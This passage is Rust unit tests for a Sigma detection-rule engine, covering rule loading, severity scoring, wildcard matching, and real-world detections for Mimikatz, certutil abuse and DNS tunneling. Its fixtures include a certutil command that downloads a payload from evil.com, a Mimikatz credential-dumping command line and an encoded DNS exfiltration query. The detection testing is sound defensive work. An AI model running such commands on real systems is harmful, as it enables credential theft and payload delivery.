            let events: Vec<HashMap<String, String>> = vec![
                process_event("normal command", "cmd.exe"),
                process_event("suspicious activity", "powershell.exe"),
                process_event("another normal", "notepad.exe"),
                process_event("very suspicious behavior", "evil.exe"),
            ];

            let results = engine.evaluate_batch(&events);
            assert_eq!(results.len(), 4);
            assert!(results[0].matches.is_empty());
            assert_eq!(results[1].matches.len(), 1);
            assert!(results[2].matches.is_empty());
            assert_eq!(results[3].matches.len(), 1);
        }

        #[test]
        fn engine_rule_with_tags() {
            let yaml = r#"
title: MITRE Tagged Rule
level: high
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'powershell'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let event = process_event("powershell -c Get-Process", "powershell.exe");
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 1);
            assert!(matches[0].tags.contains(&"attack.execution".to_string()));
            assert!(matches[0].tags.contains(&"attack.t1059.001".to_string()));
        }

        #[test]
        fn engine_load_multi_document() {
            let yaml = r#"
title: Rule One
level: low
logsource:
    category: test
detection:
    sel:
        field: val1
    condition: sel
---
title: Rule Two
level: high
logsource:
    category: test
detection:
    sel:
        field: val2
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            let (successes, errors) = engine.load_rules(yaml);
            assert_eq!(successes.len(), 2);
            assert!(errors.is_empty());
            assert_eq!(engine.rule_count(), 2);
        }

        #[test]
        fn engine_rule_list() {
            let yaml = r#"
title: Test Rule Alpha
level: medium
logsource:
    category: test
detection:
    sel:
        field: value
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();
            let list = engine.rule_list();
            assert_eq!(list.len(), 1);
            assert_eq!(list[0].1, "Test Rule Alpha");
        }

        #[test]
        fn engine_severity_scores() {
            for (level, min_score, max_score) in [
                ("informational", 0.0, 0.2),
                ("low", 0.2, 0.4),
                ("medium", 0.4, 0.6),
                ("high", 0.6, 0.8),
                ("critical", 0.8, 1.0),
            ] {
                let yaml = format!(
                    "title: Score Test\nlevel: {level}\nlogsource:\n    category: test\ndetection:\n    sel:\n        field: value\n    condition: sel\n"
                );
                let mut engine = SigmaEngine::new();
                engine.load_rule(&yaml).unwrap();

                let mut event = HashMap::new();
                event.insert("field".to_string(), "value".to_string());
                event.insert("event_category".to_string(), "test".to_string());
                let matches = engine.evaluate_event(&event);
                assert_eq!(matches.len(), 1, "No match for level: {level}");
                let score = matches[0].score;
                assert!(
                    score >= min_score && score <= max_score,
                    "Score {score} out of range [{min_score},{max_score}] for level: {level}"
                );
            }
        }

        // ─── Real-world Sigma rule patterns ────────────────────────────

        #[test]
        fn real_world_credential_dumping() {
            let yaml = r#"
title: Credential Dumping via Mimikatz
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\mimikatz.exe'
            - '\mimi.exe'
    selection_cmdline:
        CommandLine|contains:
            - 'sekurlsa'
            - 'kerberos::list'
            - 'crypto::certificates'
    condition: selection_image or selection_cmdline
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Match by image name
            let event1 = process_event("test", "C:\\Users\\attacker\\mimikatz.exe");
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Match by command line
            let event2 = process_event(
                "something.exe sekurlsa::logonpasswords",
                "C:\\temp\\renamed.exe",
            );
            assert_eq!(engine.evaluate_event(&event2).len(), 1);

            // No match
            let event3 = process_event("notepad.exe", "C:\\Windows\\notepad.exe");
            assert!(engine.evaluate_event(&event3).is_empty());
        }

        #[test]
        fn real_world_lolbin_certutil() {
            let yaml = r#"
title: Suspicious Certutil Usage
level: high
tags:
    - attack.defense_evasion
    - attack.t1140
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
            - '-decodehex'
    filter:
        CommandLine|contains: '-verify'
    condition: selection and not filter
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: suspicious certutil download
            let event1 = process_event(
                "certutil.exe -urlcache -f http://evil.com/payload.exe",
                "C:\\Windows\\System32\\certutil.exe",
            );
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Should NOT match: legitimate cert verification
            let event2 = process_event(
                "certutil.exe -verify -urlfetch cert.pem",
                "C:\\Windows\\System32\\certutil.exe",
            );
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        #[test]
        fn real_world_dns_c2_detection() {
            let yaml = r#"
title: Suspicious DNS Query Length
level: medium
logsource:
    category: dns_query
    product: windows
detection:
    selection:
        QueryName|re: '.{50,}\..*'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Long subdomain (potential DNS tunneling)
            let mut event = HashMap::new();
            event.insert("queryname".to_string(),
                "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA.evil.com".to_string());
            event.insert("event_category".to_string(), "dns_query".to_string());
            event.insert("event_product".to_string(), "windows".to_string());
            assert_eq!(engine.evaluate_event(&event).len(), 1);

            // Normal query
            let mut event2 = HashMap::new();
            event2.insert("queryname".to_string(), "www.google.com".to_string());
            event2.insert("event_category".to_string(), "dns_query".to_string());
            event2.insert("event_product".to_string(), "windows".to_string());
            assert!(engine.evaluate_event(&event2).is_empty());
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // WILDCARD MATCHING EDGE CASES
    // ═════════════════════════════════════════════════════════════════════

    mod wildcard_tests {
        use super::*;

        fn check_wildcard(pattern: &str, text: &str) -> bool {
            let event: HashMap<String, String> =
                [("f".to_string(), text.to_string())].into_iter().collect();
            let cond = FieldCondition {
                field: "f".to_string(),
                values: vec![SigmaValue::String(pattern.to_string())],
                modifiers: vec![],
            };
            match_field_condition(&cond, &event)
        }

        #[test]
        fn wildcard_star_matches_all() {
            assert!(check_wildcard("*", "anything"));
        }

        #[test]
        fn wildcard_star_matches_empty() {
            assert!(check_wildcard("*", ""));
        }

        #[test]
        fn wildcard_question_single_char() {
            assert!(check_wildcard("te?t", "test"));
            assert!(!check_wildcard("te?t", "teest"));
        }

        #[test]
        fn wildcard_prefix_star() {
            assert!(check_wildcard("*.exe", "cmd.exe"));
            assert!(!check_wildcard("*.exe", "cmd.bat"));
        }

        #[test]
        fn wildcard_suffix_star() {
            assert!(check_wildcard("C:\\Windows\\*", "C:\\Windows\\System32"));
        }

        #[test]
        fn wildcard_middle_star() {
            assert!(check_wildcard("cmd*exe", "cmd.exe"));
            assert!(check_wildcard("cmd*exe", "cmd_something.exe"));
        }

        #[test]
        fn wildcard_multiple_stars() {
            assert!(check_wildcard("*\\*\\powershell.exe", "C:\\Windows\\System32\\powershell.exe"));
        }

        #[test]
        fn no_wildcard_exact() {
            assert!(check_wildcard("exact", "exact"));
            assert!(!check_wildcard("exact", "not_exact"));
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // SEVERITY SCORE TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod severity_tests {
        use super::*;

        #[test]
        fn severity_ordering() {
            let scores: Vec<f64> = [
                SeverityLevel::Informational,
                SeverityLevel::Low,
                SeverityLevel::Medium,
                SeverityLevel::High,
                SeverityLevel::Critical,
            ].iter().map(|s| s.to_score()).collect();

            for i in 1..scores.len() {
                assert!(scores[i] > scores[i - 1],
                    "Severity scores not monotonically increasing");
            }
        }

        #[test]
        fn severity_score_range() {
            for level in [
                SeverityLevel::Informational,
                SeverityLevel::Low,
                SeverityLevel::Medium,
                SeverityLevel::High,
                SeverityLevel::Critical,
            ] {
                let score = level.to_score();
                assert!((0.0..=1.0).contains(&score),
                    "Score {score} out of [0,1] range for {:?}", level);
            }
        }
    }
}
